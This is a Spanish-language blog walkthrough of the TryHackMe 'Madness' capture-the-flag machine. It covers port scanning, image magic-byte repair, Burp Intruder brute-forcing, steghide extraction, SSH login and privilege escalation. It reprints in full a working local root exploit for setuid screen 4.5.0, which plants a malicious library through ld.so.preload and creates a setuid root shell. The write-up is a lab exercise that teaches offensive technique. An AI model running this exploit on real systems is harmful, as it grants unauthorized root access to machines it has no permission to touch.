---
layout: post
title: Tryhackme Madness
date: 2022-09-15
modified: 2022-09-15
description: resolución de la maquina madness de la plataforma tryhackme.
tag:
 - thyhackme
 - ctf
---

Iniciamos la máquina con un escaneo de puertos de nmap.

	nmap -p- --min-rate 5000 -sS -vvv -n -Pn --open -oG ports 10.10.108.64
	
El cual nos regresa que solo hay dos puertos activos, el 22 con el servicio ssh y el 80 corriendo un servidor http.

	# Nmap 7.92 scan initiated Mon Sep 12 12:20:45 2022 as: nmap -p- --min-rate 5000 -sS -vvv -n -Pn --open -oG ports 10>
	# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
	Host: 10.10.108.64 () Status: Up
	Host: 10.10.108.64 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http/// Ignored State: closed (65533)
	# Nmap done at Mon Sep 12 12:21:00 2022 -- 1 IP address (1 host up) scanned in 15.33 seconds
	
Al solo tener dos puertos abiertos, entraremos directamente a ver el servidor htttp abierto. Estando dentro nos encontramos con la página por defecto de apache2.

![imagen 1](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero.png)

En este punto pensé en tirar de `wfuzz`, pero no encontré nada, así que fue una pérdida de tiempo. Pero si miramos la página más detenidamente. nos encontraremos con un pequeño pixel.

![imagen2](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero2.png)

Al no poder verlo, hay que descargarlo y ver cuál es el problema con la imagen. Haciendo uso de `wget` descargamos la imagen.

	wget http://10.10.50.135/thm.jpg

Una vez descargado vemos algo raro, Los números mágicos pertenecen a un archivo PNG, pero su extensión es JPG. Y si queremos abrir el archivo nos encontraremos con el mismo problema que antes.

![imagen3](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero4.jpg)

Hay que cambiar los números por su valor correspondiente. Haciendo una búsqueda en Google, vemos que su valor original debería ser `ff d8 ff e0 00 10 4a 46 49 46 00 01`así que corregimos esto usando `hexedit`Nota: por alguna razón no viene instalado en parrot, pero lo podemos instalar. `sudo apt install hexedit`

![imagen4](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero3.png)

En la imagen vemos una ruta nueva y si la ponemos en el navegador nos llevará a una página web.

![imagen5](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero232.png)


Impresionando el html nos encontramos con un mensaje y  nos damos una idea de lo que hay que hacer, aunque hay que hacerlo de una manera algo específica. Si solo escribimos la ruta 1,2,3, etc, nunca llegaremos a nada. hay que escribirlo como si fuera una variable.


	http://10.10.50.135/th1s_1s_h1dd3n/?secret=0


![imagen6](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero011.png)

Ahora que sabemos que hacer, podríamos escribir número por número hasta dar con el resultado, pero en este caso, burpsuite puede ser una mejor opción. Entraremos a burp e interceptamos la primera petición y luego la mandaremos al `intruder` para hacer uso de la opción `sniper`.

![imagen7](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero382.png)

![imagen8](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero10.png)

Pero antes de iniciar necesitamos un pequeño archivo que contenga los 100 números, para este problema, solo haremos un script de python.

	for i in range(0,100):

	print(i)

Ejecutaremos el script y lo pasaremos a un archivo txt para que nos guarde los números generados.

	python3 numeros.py > numeros.txt

Y listo, ahora tenemos los 100 números. Podemos regresar a burp y hacer uso de sniper, solo hay que agregar la lista que acabamos qué hacer.

![imagen8](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero1111.png)

![imange9](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero01189.png)


Una vez finalizado, vemos que la única respuesta diferente fue el número 73. 

![imagen10](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero323.png)

Al entrar a la página web agregando el número, vemos que obtenemos un resultado diferente, ahora parece que tenemos una contraseña.

![imagen12](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero322.png)

Pero de qué es?, es la contraseña de un archivo que está guardado en la imagen thm.jpg; para extraerlo podemos hacerlo con una herramienta `steghide`.

	steghide extract -sf thm.jpg

Al extraerlo vemos que nos regresa un archivo txt de nombre hidden.

![imagen13](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero2111.png)

Ahora parece ser que tenemos un usuario, pero al verdad es que se encuentra en formato ROT 13 asi que para verlo vamos a hacer uso de la página [root13](https://rot13.com/).

![imagen14](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero1211.png)

Ahora tenemos un usuario para probar en ssh, pero nos falta una contraseña...¿donde puede estar?. La respuesta está en la imagen del inicio.

![imagen15](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero8873.png)

Nos descargamos la imagen usando `wget` y al igual que hicimos con thm.jpg, usamos `steghide`, pero esta vez no necesitamos ninguna contraseña.

		steghide extract -sf 5iW7kC8.jpeg

Lo cual nos regresará un archivo txt con el nombre password.

![imagen16](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero195.png)

Listo, tenemos un usuario y una contraseña en texto claro, con esto podemos conectarnos a ssh.

![imagen17](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero3285.png)

La primera flag se encuentra en `/home/joker/` y para obtener la segunda hay que escalar privilegios. Para eso haremos una búsqueda por permisos 4000 pertenecientes a root. 

		find / -perm /4000 2>/dev/null


Al hacer la búsqueda nos damos cuenta que hay un binario interesante, más específicamente `screen-4.5.0`, el cual fue reportado por tener un bug que podía ser usado para escalar privilegios.

![imagen18](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero564.png)

Usando un exploit disponible en [exploit-db](https://www.exploit-db.com/exploits/41154) podemos escalar privilegios de manera rapida.

```sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```
Copiamos el exploit y dentro de la máquina víctima hacemos un `archivo.sh` luego le damos permisos de ejecución `chmod +x archivo.sh` y lo ejecutamos `./archivo.sh`. Y listo, somos root.

![imagen19](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-madness/zero2121.png)

